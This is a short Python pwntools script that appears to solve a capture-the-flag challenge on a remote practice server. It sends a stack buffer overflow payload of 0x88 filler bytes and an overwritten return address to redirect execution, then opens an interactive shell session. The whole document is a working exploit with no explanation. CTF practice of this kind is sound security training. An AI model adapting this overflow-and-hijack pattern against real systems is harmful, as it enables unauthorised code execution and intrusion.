from pwn import *

conn = remote("node4.buuoj.cn", 25886)

conn.recvuntil(b"\n")

# ret = 0x4005a5
payload = b'a'* (0x80 + 0x8) + p64(0x400596)
conn.sendline(payload)
conn.interactive()
